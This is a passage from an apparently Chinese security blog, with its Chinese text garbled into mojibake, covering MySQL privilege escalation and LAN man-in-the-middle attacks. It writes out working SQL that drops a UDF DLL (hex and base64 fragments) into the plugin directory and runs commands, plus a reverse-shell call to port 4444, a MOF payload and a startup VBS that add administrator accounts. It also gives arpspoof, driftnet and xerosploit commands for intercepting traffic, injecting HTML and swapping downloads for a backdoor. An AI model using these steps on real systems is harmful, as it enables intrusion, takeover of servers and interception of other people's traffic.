ç„¶åæŠŠå¯¹åº”ç³»ç»Ÿudf.dllæˆ–è€…udf.soä¸Šä¼ ä¸Šå» ç½‘å€ï¼šhttps://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql ä¸Šä¼ çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç½‘ç»œè·¯å¾„ 1select load_file(&#x27;\\\\\\\\192.168.0.19\\\\network\\\\lib_mysqludf_sys_64.dll&#x27;) into dumpfile &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; å¦ä¸€ç§æ–¹æ³•æ˜¯å°†æ•´ä¸ªDLLæ–‡ä»¶ä»¥åå…­è¿›åˆ¶ç¼–ç åå†™å…¥ç£ç›˜ã€‚ 123select hex(load_file(&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;/tmp/udf.hex&#x27;;select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000â€¦ into dump file &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªè¡¨å¹¶å°†äºŒè¿›åˆ¶æ•°æ®æ’å…¥åˆ°åå…­è¿›åˆ¶ç¼–ç æµä¸­ã€‚ä½ å¯ä»¥é€šè¿‡insertè¯­å¥æˆ–å°†å…¶åˆ†è§£ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼Œç„¶åé€šè¿‡updateè¯­å¥æ‹¼æ¥äºŒè¿›åˆ¶æ•°æ®ã€‚ 1234567create table temp(data longblob);insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);select data from temp into dump file &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; æˆ–è€…ä½ ä¹Ÿå¯ä»¥ç›´æ¥ä»ç£ç›˜å°†æ–‡ä»¶ä»ç½‘ç»œå…±äº«åŠ è½½åˆ°ä¸Šé¢åˆ›å»ºçš„è¡¨ä¸­ï¼Œæˆ–ä½¿ç”¨â€œå¿«é€Ÿå¯¼å…¥æ•°æ®ï¼ˆload data infileï¼‰â€è¯­å¥åœ¨æœ¬åœ°åŠ è½½ã€‚å°†æ–‡ä»¶åƒä¸Šé¢æ˜¾ç¤ºçš„é‚£æ ·è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶åœ¨å†™å…¥ç£ç›˜æ—¶è§£ç ã€‚ 12345load data infile &#x27;\\\\\\\\192.168.0.19\\\\network\\\\udf.hex&#x27; into table temp fields terminated by &#x27;@OsandaMalith&#x27; lines terminated by &#x27;@OsandaMalith&#x27; (data);select unhex(data) from temp into dumpfile &#x27;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&#x27;; è¿™é‡Œæœ‰ä¸ªå¥½æ¶ˆæ¯ï¼Œå°±æ˜¯ä»MySQL 5.6.1å’ŒMariaDB 10.0.5å¼€å§‹ï¼Œæ–°å¢äº†to_base64å’Œfrom_base64å‡½æ•°ã€‚å¦‚æœä½ æ˜¯ä¸€ä¸ªå–„äºç»•è¿‡SQLæ³¨å…¥WAFçš„äººï¼Œç›¸ä¿¡ä½ å·²ç»åœ¨ä½¿ç”¨è¿™äº›å‡½æ•°äº†ï¼ˆæç¤ºï¼šè·¯ç”±æŸ¥è¯¢æ³¨å…¥ï¼‰ã€‚ 12select to_base64(load_file(&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;/tmp/udf.b64&#x27;; ä½ å¯ä»¥ç¼–è¾‘base64æ–‡ä»¶å¹¶é€šè¿‡ä»¥ä¸‹æ–¹å¼å°†å…¶dumpåˆ°æ’ä»¶ç›®å½•ã€‚ 1234567891011select from_base64(&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIAAABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAREAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA&quot;) into dumpfile &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; ä¹‹åï¼Œä½ å¯ä»¥åƒè¿™æ ·å°†æ•´ä¸ªæ–‡ä»¶ä¼ é€’ç»™mysqlã€‚ 1mysql -h192.168.0.30 -uosanda -pabc123 &lt; /tmp/udf.b64 ä½ ä¹Ÿå¯ä»¥ä»ç½‘ç»œå…±äº«å†™å…¥base64ç¼–ç æ–‡ä»¶æˆ–ä½¿ç”¨â€œå¿«é€Ÿå¯¼å…¥æ•°æ®ï¼ˆload data infileï¼‰â€è¯­å¥åœ¨æœ¬åœ°åŠ è½½å¹¶é€šè¿‡ä»¥ä¸‹è¯­å¥dumpã€‚ 12select from_base64(data) from temp into dumpfile &#x27;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&#x27;; æ¥ç€å°†udfçš„è‡ªå®šä¹‰å‡½æ•°å¼•å…¥ 1CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27; æ‰§è¡Œå‘½ä»¤ 1select sys_eval(&#x27;whoami&#x27;) åå¼¹ç«¯å£ææƒåŸç†å°±æ˜¯åŸºäºudfææƒ expï¼šhttps://github.com/BeyondOneself/mysql-reverse-shell-priviledge å£°æ˜ä¸€ä¸ªbackdoorå‡½æ•°ï¼Œç¬¬äºŒæ¡å®šä¹‰çš„@aæ˜¯udf.dllå†…å®¹çš„16è¿›åˆ¶ æ‰§è¡Œå³å¯æˆåŠŸåå¼¹shell 1select backshell(&quot;192.168.0.12&quot;,4444); mofææƒmofææƒç®€ä»‹MOFæ–‡ä»¶æ˜¯mysqlæ•°æ®åº“çš„æ‰©å±•æ–‡ä»¶ï¼ˆåœ¨c:/windows/system32/wbem/mof/nullevt.mofï¼‰å«åšâ€æ‰˜ç®¡å¯¹è±¡æ ¼å¼â€ï¼Œå…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚ MOFæ–‡ä»¶æ—¢ç„¶æ¯äº”ç§’å°±ä¼šæ‰§è¡Œï¼Œè€Œä¸”æ˜¯ç³»ç»Ÿæƒé™ï¼Œæˆ‘ä»¬é€šè¿‡mysqlå°†æ–‡ä»¶å†™å…¥ä¸€ä¸ªMOFæ–‡ä»¶æ›¿æ¢æ‰åŸæœ‰çš„MOFæ–‡ä»¶ï¼Œç„¶åç³»ç»Ÿæ¯éš”äº”ç§’å°±ä¼šæ‰§è¡Œä¸€æ¬¡æˆ‘ä»¬ä¸Šä¼ çš„MOFã€‚MOFå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶è¿™æ®µvbsè„šæœ¬çš„å†…å®¹è®©ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤ï¼Œè¿›è¡Œææƒã€‚ åˆ©ç”¨æ¡ä»¶ Windows&lt;=2003 mysqlåœ¨c:windows/system32/mofç›®å½•æœ‰å†™æƒé™ å·²çŸ¥æ•°æ®åº“è´¦å·å¯†ç  exp: 12345678910111213141516171819202122#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;)instance of __EventFilter as $EventFilter&#123;EventNamespace = &quot;Root\\\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123;Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user test 123456 /add\\&quot;)&quot;;&#125;;instance of __FilterToConsumerBinding&#123;Consumer = $Consumer;Filter = $EventFilter;&#125;; ç¡®ä¿äº†å‰é¢çš„æ¡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ æˆ‘ä»¬çš„mofæ–‡ä»¶åˆ°æœåŠ¡å™¨ä»»æ„ç›®å½•ï¼Œä¸€èˆ¬æ˜¯ç½‘ç«™å…è®¸ä¸Šä¼ çš„ç›®å½•ã€‚ ç„¶åé€šè¿‡mysqlè¯­å¥å°†è¿™ä¸ªæ–‡ä»¶å¯¼å…¥åˆ°nullevt.mof 1select load_file(&quot;F:/wamp/www/upload/test.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot; è¿™é‡Œç”¨åˆ°äº†dumpfileè€Œä¸æ˜¯outfileæ˜¯å› ä¸ºï¼š dumpfileåªèƒ½å¯¼å‡ºä¸€è¡Œæ•°æ® outfileå¯ä»¥å®Œæ•´çš„å¯¼å‡ºæ¯è¡Œè®°å½•ï¼Œå¹¶ä¸”ä¼šåœ¨è¡Œæœ«ç«¯å†™å…¥æ–°è¡Œï¼Œå¹¶ä¸”ä¼šè½¬ä¹‰æ¢è¡Œç¬¦ã€‚ å¦‚æœç”¨outfileè¿™ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶å°±ä¼šè¢«ç ´åï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†dumpfileã€‚ ç„¶åæˆ‘ä»¬åˆ†åˆ«ä¸¤æ¬¡å°†åˆ›å»ºç”¨æˆ·å’Œææƒå‘½ä»¤æ›¿æ¢pocä¸­çš„å‘½ä»¤åšä¸Šè¿°æ“ä½œå³å¯ã€‚ä¸¤æ¬¡ä½¿ç”¨çš„å‘½ä»¤å¦‚ä¸‹: 12net.exe user test 123456 /addnet.exe user localgroup administrators test /add åˆ é™¤è´¦å·éœ€è¦é‡å¯æœåŠ¡ï¼š 123net stop winmgmtdel c:/windows/system32/wbem/repositorynet start winmgmt æŒ‰ç…§è¿™ç§æ€è·¯æˆ‘ä»¬ä¹Ÿå¯ä»¥å†™vbsåˆ°å¼€æœºå¯åŠ¨é¡¹ 12345create table a (cmd text); insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); select * from a into outfile &quot;C:\\\\Documents and Settings\\\\All Users\\\\ã€Œå¼€å§‹ã€èœå•\\\\ç¨‹åº\\\\å¯åŠ¨\\\\a.vbs&quot;; å‚è€ƒï¼š https://xz.aliyun.com/t/7392 https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83 https://xz.aliyun.com/t/2719 https://www.freebuf.com/articles/system/163144.html https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.m00nback.xyz/tags/mysql/"},{"name":"ææƒ","slug":"ææƒ","permalink":"http://www.m00nback.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"ä¸­é—´äººæ”»å‡»å­¦ä¹ ","slug":"ä¸­é—´äººæ”»å‡»å­¦ä¹ ","date":"2020-03-25T10:16:03.000Z","updated":"2020-03-26T04:31:06.328Z","comments":true,"path":"2020/03/25/ä¸­é—´äººæ”»å‡»å­¦ä¹ /","link":"","permalink":"http://www.m00nback.xyz/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»ä¸­é—´äººæ”»å‡»çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»ä¸­é—´äººæ”»å‡»çš„ç›¸å…³å†…å®¹ï¼ æœ¬æ–‡ä»…ä½œæŠ€æœ¯äº¤æµï¼Œè¯·å‹¿åšè¿æ³•ä¹±çºªçš„äº‹ï¼ ä¸­é—´äººæ”»å‡»ä¸­é—´äººæ”»å‡»ï¼ˆMan-in-the-MiddleAttackï¼Œç®€ç§°â€œMITMæ”»å‡»â€ï¼‰æ˜¯ä¸€ç§â€œé—´æ¥â€çš„å…¥ä¾µæ”»å‡»ï¼Œè¿™ç§æ”»å‡»æ¨¡å¼æ˜¯é€šè¿‡å„ç§æŠ€æœ¯æ‰‹æ®µå°†å—å…¥ä¾µè€…æ§åˆ¶çš„ä¸€å°è®¡ç®—æœºè™šæ‹Ÿæ”¾ç½®åœ¨ç½‘ç»œè¿æ¥ä¸­çš„ä¸¤å°é€šä¿¡è®¡ç®—æœºä¹‹é—´ï¼Œè¿™å°è®¡ç®—æœºå°±ç§°ä¸ºâ€œä¸­é—´äººâ€ã€‚è¿™æ ·çš„è¯ï¼Œä¸¤å°é€šä¿¡è®¡ç®—æœºä¹‹é—´çš„æµé‡éƒ½ä¼šç»è¿‡è¢«æ§è®¡ç®—æœºï¼Œé€šè¿‡ä¿¡æ¯ç¯¡æ”¹ï¼Œä¿¡æ¯çªƒå–ç­‰æ–¹å¼å¯¹æ­£å¸¸çš„é€šä¿¡é€ æˆå¨èƒã€‚ éšç€è®¡ç®—æœºé€šä¿¡ç½‘æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼ŒMITMæ”»å‡»ä¹Ÿè¶Šæ¥è¶Šå¤šæ ·åŒ–ã€‚æœ€åˆï¼Œæ”»å‡»è€…åªè¦å°†ç½‘å¡è®¾ä¸ºæ··æ‚æ¨¡å¼ï¼Œä¼ªè£…æˆä»£ç†æœåŠ¡å™¨ç›‘å¬ç‰¹å®šçš„æµé‡å°±å¯ä»¥å®ç°æ”»å‡»ï¼Œè¿™æ˜¯å› ä¸ºå¾ˆå¤šé€šä¿¡åè®®éƒ½æ˜¯ä»¥æ˜æ–‡æ¥è¿›è¡Œä¼ è¾“çš„ï¼Œå¦‚HTTPã€FTPã€Telnetç­‰ã€‚åæ¥ï¼Œéšç€äº¤æ¢æœºä»£æ›¿é›†çº¿å™¨ï¼Œç®€å•çš„å—…æ¢æ”»å‡»å·²ç»ä¸èƒ½æˆåŠŸï¼Œå¿…é¡»å…ˆè¿›è¡ŒARPæ¬ºéª—æ‰è¡Œã€‚å¦‚ä»Šï¼Œè¶Šæ¥è¶Šå¤šçš„æœåŠ¡å•†ï¼ˆç½‘ä¸Šé“¶è¡Œï¼Œé‚®ç®±ç™»é™†ï¼‰å¼€å§‹é‡‡ç”¨åŠ å¯†é€šä¿¡ï¼ŒSSL(Secure Sockets Layer å®‰å…¨å¥—æ¥å±‚)æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„æŠ€æœ¯ï¼ŒHTTPSã€FTPSç­‰éƒ½æ˜¯å»ºç«‹åœ¨å…¶åŸºç¡€ä¸Šçš„ã€‚ arpåœ°å€æ¬ºéª—åœ¨åŒä¸€å±€åŸŸç½‘å†…çš„ä¸»æœºé€šä¿¡ä¾é arpåœ°å€è€Œä¸æ˜¯ipåœ°å€ï¼Œå½“ä¸¤å°ä¸»æœºé€šä¿¡æ—¶(A å’Œ B)ï¼Œä¸»æœºA å‘ä¸»æœºBå‘é€ä¸€ä¸ªarpå¹¿æ’­ï¼ˆå†…æœ‰ä¸»æœºBçš„IPåœ°å€ï¼‰ï¼Œå±€åŸŸç½‘å†…çš„æ‰€æœ‰ä¸»æœºéƒ½ä¼šæ”¶åˆ°è¿™ä¸ªarpåŒ…ï¼Œç„¶åä¸åœ¨è‡ªå·±çš„ipåœ°å€è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç¬¦åˆå°±å›å¤ç»™ä¸»æœº A ä¸€ä¸ªå¸¦æœ‰è‡ªå·±çš„arpåœ°å€çš„arpåŒ…ï¼ŒåŒæ—¶å°†ä¸»æœº A çš„arpåœ°å€è®°å½•ä¸‹æ¥ã€‚æ¥ç€ä½¿ç”¨è¿™ä¸ªMACåœ°å€å‘é€æ•°æ®ï¼ˆç”±ç½‘å¡é™„åŠ MACåœ°å€ï¼‰ã€‚å› æ­¤ï¼Œæœ¬åœ°é«˜é€Ÿç¼“å­˜çš„è¿™ä¸ªARPè¡¨æ˜¯æœ¬åœ°ç½‘ç»œæµé€šçš„åŸºç¡€ï¼Œè€Œä¸”è¿™ä¸ªç¼“å­˜æ˜¯åŠ¨æ€çš„ï¼Œä¸»æœºçš„æ¯æ¬¡é€šä¿¡éƒ½éœ€è¦ä»æ–°å‘é€arpå¹¿æ’­åŒ…å¾—åˆ°ä¸»æœº B çš„arpåœ°å€ï¼ˆåŠ¨æ€æ€§ï¼‰ã€‚ å¦‚æœè¿™æ—¶æœ‰ä¸€å°ä¸»æœºCæƒ³è¦è·å–ä¸¤å°ä¸»æœºçš„é€šä¿¡è¿‡ç¨‹æ—¶ï¼Œä¸»æœºC å¯ä»¥ä¸»åŠ¨å‘ä¸»æœºA å‘é€ arpåº”ç­”åŒ… ä¸»æœºAæ¥æ”¶åˆ°è¿™ä¸ªåº”ç­”åŒ…åæ›´æ–°è‡ªå·±çš„arpç¼“å­˜è¡¨ å½“ç„¶è¿˜æ˜¯Bçš„ipä½†macåœ°å€å·²ç»æ”¹å˜ ï¼Œè¿™æ—¶ä¸»æœºCå†æ­£å¸¸è¿æ¥ä¸»æœºBï¼Œè¿™æ ·å°±å¯ä»¥ç›‘å¬åŒæ–¹çš„é€šä¿¡è¿‡ç¨‹å¹¶ä¸”ä¸è¢«å‘ç° ï¼Œè¿™æ˜¯ä¸€ç§æœ€å…¸å‹çš„arpæ¬ºéª—ã€‚ å¸¸ç”¨å·¥å…·arp-scanarp-scanæ˜¯Kali Linuxè‡ªå¸¦çš„ä¸€æ¬¾ARPæ‰«æå·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥è¿›è¡Œå•ä¸€ç›®æ ‡æ‰«æï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæ‰¹é‡æ‰«æã€‚æ‰¹é‡æ‰«æçš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡CIDRã€åœ°å€èŒƒå›´æˆ–è€…åˆ—è¡¨æ–‡ä»¶çš„æ–¹å¼æŒ‡å®šã€‚è¯¥å·¥å…·å…è®¸ç”¨æˆ·å®šåˆ¶ARPåŒ…ï¼Œæ„å»ºéæ ‡å‡†æ•°æ®åŒ…ã€‚åŒæ—¶ï¼Œè¯¥å·¥å…·ä¼šè‡ªåŠ¨è§£æMacåœ°å€ï¼Œç»™å‡ºMACå¯¹åº”çš„ç¡¬ä»¶å‚å•†ï¼Œå¸®åŠ©ç”¨æˆ·ç¡®è®¤ç›®æ ‡ã€‚ æŸ¥çœ‹åŒä¸€å±€åŸŸç½‘å­˜æ´»çš„ä¸»æœºï¼š 1arp-scan --interface=wlan0 --localnet arpspoofarpspoofæ˜¯ä¸€ä¸ªå¥½ç”¨çš„ARPæ¬ºéª—å·¥å…·ã€‚ 1arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host -i æŒ‡å®šç½‘å¡ -c æŒ‡å®šè¿˜åŸarpé…ç½®æ—¶ä½¿ç”¨çš„ç¡¬ä»¶åœ°å€ -t æŒ‡å®šarpæ¬ºéª—çš„ç›®æ ‡ hostä¸€èˆ¬ä¸ºç½‘å…³ -r æ¬ºéª—ä¸¤ä¸ªä¸»æœºï¼ˆç½‘å…³å’Œç›®æ ‡ï¼‰ä»¥æ•è·åŒå‘é€šä¿¡ æ¬ºéª—ç½‘å…³å’Œç›®æ ‡ï¼š 1arpspoof -i wlan0 -t 192.168.1.105 -r 192.168.1.1 driftnetdriftnetæ˜¯ä¸€æ¬¾ç®€å•è€Œä½¿ç”¨çš„å›¾ç‰‡æ•è·å·¥å…·ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨ç½‘ç»œæ•°æ®åŒ…ä¸­æŠ“å–å›¾ç‰‡ã€‚è¯¥å·¥å…·å¯ä»¥å®æ—¶å’Œç¦»çº¿æ•è·æŒ‡å®šæ•°æ®åŒ…ä¸­æ˜¯å›¾ç‰‡ï¼Œkalié‡Œé»˜è®¤æœ‰ã€‚ ä¸»è¦å‚æ•°ï¼š -b æ•è·åˆ°æ–°çš„å›¾ç‰‡æ—¶å‘å‡ºå˜Ÿå˜Ÿå£° -i interface é€‰æ‹©ç›‘å¬æ¥å£ -f file è¯»å–ä¸€ä¸ªæŒ‡å®špcapæ•°æ®åŒ…ä¸­çš„å›¾ç‰‡ -p ä¸è®©æ‰€ç›‘å¬çš„æ¥å£ä½¿ç”¨æ··æ‚æ¨¡å¼ -a åå°æ¨¡å¼ï¼šå°†æ•è·çš„å›¾ç‰‡ä¿å­˜åˆ°ç›®å½•ä¸­ï¼ˆä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼‰ -m number æŒ‡å®šä¿å­˜å›¾ç‰‡æ•°çš„æ•°ç›® -d directory æŒ‡å®šä¿å­˜å›¾ç‰‡çš„è·¯å¾„ -x prefix æŒ‡å®šä¿å­˜å›¾ç‰‡çš„å‰ç¼€å åå°ç›‘å¬ç½‘å¡ä¿å­˜å›¾ç‰‡å¹¶æç¤ºï¼š 1driftnet -i wlan0 -b -a -d /root/Desktop/pic xerosploitgithubåœ°å€ï¼šhttps://github.com/LionSec/xerosploit Xerosploitæ˜¯ä¸€æ¬¾å¯ä»¥è¿›è¡Œä¸­é—´äººæ”»å‡»çš„æ¸—é€æµ‹è¯•å·¥å…·åŒ…ã€‚å®ƒå…·æœ‰å¤šç§æ¨¡å—ï¼Œå¯ä»¥è¿›è¡Œå¤šé‡æœ‰æ•ˆçš„æ”»å‡»ï¼Œå¦‚æ‹’ç»æœåŠ¡å’Œç«¯å£æ‰«æã€åŠ«æŒç­‰ã€‚ç”±bettercapå’Œnmapå¼ºåŠ›é©±åŠ¨ã€‚ å¯æƒœçš„æ˜¯ï¼Œè¿™æ¬¾å·¥å…·å·²ç»å¾ˆé•¿æ—¶é—´ä¸ç»´æŠ¤äº†ï¼Œä½†åŠŸèƒ½ä¾æ—§å¾ˆå¼ºå¤§ å·¥å…·å®‰è£…ï¼š 123git clone https://github.com/LionSec/xerosploitcd xerosploit &amp;&amp; sudo python install.pysudo xerosploit å®‰è£…ä¸­å¯èƒ½ä¼šä¼šç¼ºå°‘ä¾èµ–åŒ…ï¼Œç›´æ¥pipå®‰è£…å°±è¡Œ æœ‰è¿™ä¹ˆå¤šæ¨¡å—ï¼Œç›´æ¥ä½¿ç”¨å°±è¡Œï¼Œéå¸¸æ–¹ä¾¿ï¼š 12345678910111213pscanï¼šç«¯å£æ‰«ædosï¼šå¯¹ç›®æ ‡è¿›è¡Œdosæ”»å‡»pingï¼šå¯¹ç›®æ ‡è¿›è¡Œpingæ˜¯å¦å­˜æ´»injecthtmlï¼šå°†htmlæ³¨å…¥åˆ°ç›®æ ‡è®¿é—®çš„ç½‘ç«™ä¸­injectjsï¼šå°†javascriptæ³¨å…¥åˆ°ç›®æ ‡è®¿é—®çš„ç½‘ç«™ä¸­rdownloadï¼šæ›¿æ¢ç›®æ ‡ä¸‹è½½çš„æ–‡ä»¶sniffï¼šå—…æ¢ç›®æ ‡çš„æµé‡ä¿¡æ¯dspoofï¼šå°†æ‰€æœ‰httpæµé‡é‡å®šå‘åˆ°ç‰¹å®šipyplayï¼šåœ¨ç›®æ ‡çš„æµè§ˆå™¨ä¸­åå°æ’­æ”¾youtubeè§†é¢‘ï¼ˆè¿˜å¾—fqï¼‰replaceï¼šæ›¿æ¢ç›®æ ‡è®¿é—®ç½‘ç«™çš„æ‰€æœ‰å›¾ç‰‡driftnetï¼šæŸ¥çœ‹ç›®æ ‡è®¿é—®ç½‘ç«™çš„æ‰€æœ‰å›¾ç‰‡moveï¼šè®©ç›®æ ‡è®¿é—®ç½‘ç«™å˜å¾—æŠ–åŠ¨defaceï¼šå°†ç›®æ ‡è®¿é—®ç½‘ç«™çš„æ‰€æœ‰é¡µé¢æ›¿æ¢æˆè‡ªå·±å®šä¹‰çš„htmlä»£ç  æŠ“å–å±€åŸŸç½‘é‡Œçš„å›¾ç‰‡kaliï¼š192.168.0.112 é¶æœºï¼š192.168.0.103 æ²¡è¿›è¡Œarpæ¬ºéª—ä¹‹å‰ï¼Œæˆ‘ä»¬çœ‹ä¸‹arpè¡¨ è®©åè®¾ç½®ipè½¬å‘,é»˜è®¤ä¸º0 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward å¦‚æœä¸è®¾ç½®ä¸º1ï¼Œè¿›è¡Œä¸‹é¢çš„æ“ä½œç›¸å½“äºæ–­ç½‘æ”»å‡» ç„¶åæˆ‘ä»¬è¿›è¡Œæ¬ºéª— 1arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1 æ­¤æ—¶æˆ‘ä»¬å†çœ‹ä¸‹arpè¡¨ï¼Œå‘ç°macåœ°å€å·²ç»å‘ç”Ÿæ”¹å˜æˆkaliçš„macåœ°å€ å¯ä»¥çœ‹åˆ°è¿™é‡Œå·²ç»æŠ“åˆ°å›¾ç‰‡ï¼Œæ„Ÿè°¢å¤§ä½¬çš„åšå®¢åšå®éªŒï¼Œé€ƒâ€¦â€¦ å‘ç°å¹¶ä¸æ˜¯å¾ˆå…¨ï¼Œhttpsçš„éƒ½æ²¡æŠ“åˆ° æˆ‘ä»¬ç”¨wiresharkæŸ¥çœ‹ä¸€ä¸‹æµé‡ï¼Œè®¾ç½®ä¸€ä¸‹æºåœ°å€ï¼Œå°±èƒ½çœ‹åˆ°æˆªè·çš„æµé‡ 1ip.src==192.168.0.103 xerosploitä¸€äº›æ“ä½œå®‰è£…ç»“æŸåç›´æ¥è¿è¡Œxerosploit è¾“å…¥helpè·å–å¸®åŠ©ï¼Œç›´æ¥scanå‘½ä»¤æ‰«æï¼Œæœ‰æ—¶å€™ä¾¯å¯èƒ½æ‰«æä¸åˆ°ï¼Œç›´æ¥è¾“ipå°±è¡Œ è¿›å…¥modulesä¹‹åï¼ŒhelpæŸ¥çœ‹æ‰€æœ‰æ¨¡å—ï¼Œå…ˆè¯•è¯•æ³¨å…¥html 1&lt;h1 style=&quot;font-size:80px;&quot; &gt;hacked by MoonBack!&lt;/h1&gt; éšä¾¿æ‰¾äº†ä¸ªä¸æ˜¯httpsçš„ç«™ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æ³¨å…¥æˆåŠŸ æ›¿æ¢æ‰€æœ‰å›¾ç‰‡ï¼Œéšä¾¿æ‰¾çš„ä¸€ä¸ªç«™ç‚¹ï¼Œæ²¡ä»€è«ç‰¹åˆ«çš„æ„æ€ æ›¿æ¢ä¸‹è½½æ–‡ä»¶ æˆ‘ä»¬è¯•ç€ä¸‹è½½ä¸€ä¸ªexe å’Œkalié‡Œç”Ÿæˆçš„åé—¨ä¸€æ · ä¼ªé€ è¯ä¹¦æŠ“httpsé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä»½æ•°å­—æ ¹è¯ä¹¦ï¼Œå¯ä»¥ç”¨opensslç”Ÿæˆ å…ˆç”Ÿæˆè¯ä¹¦ç§é’¥æ–‡ä»¶ 1openssl genrsa -out ca.key 2048 